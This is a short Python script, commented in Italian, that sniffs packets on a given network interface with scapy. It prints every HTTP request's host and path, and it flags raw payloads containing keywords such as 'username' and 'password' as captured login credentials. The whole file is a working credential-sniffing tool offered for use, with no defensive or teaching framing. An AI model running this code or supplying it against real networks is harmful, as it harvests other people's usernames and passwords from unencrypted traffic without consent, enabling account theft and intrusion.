#!/usr/bin/env python
import argparse
import scapy.all as scapy
from scapy.layers import http
# Repositoty Github scapy-http : https://github.com/invernizzi/scapy-http

def get_arg():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interfaccia",dest="interfaccia",help="Specificare la interfaccia con cui si vuole esguire il tool (es. eth0)")
    opzioni = parser.parse_args()
    if not opzioni.interfaccia:
        parser.error("[-]Specificare l'interfaccia su cui effettuare l'operazione , vedere --help per maggiori informazioni")

    return opzioni

# Definizione del processo di sniff dei pacchettti
# Documetazione per la gestione dello sniff con scapy : https://scapy.readthedocs.io/en/latest/extending.html
def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet)

# Filtro del pacchetti solo di tipo HTTPRequest Host e Path
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Filtro per credenziali tramite parole chiavi
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username","user","login","password","pass"]
        for keyword in keywords:
            if keyword in load:
                return load

# Gestione Stampa
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>>>> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possibile occorenza di username/password >" + str(login_info) + "\n\n")

def main():
    opzioni = get_arg()
    sniff(str(opzioni.interfaccia))

if __name__ == "__main__":
    main()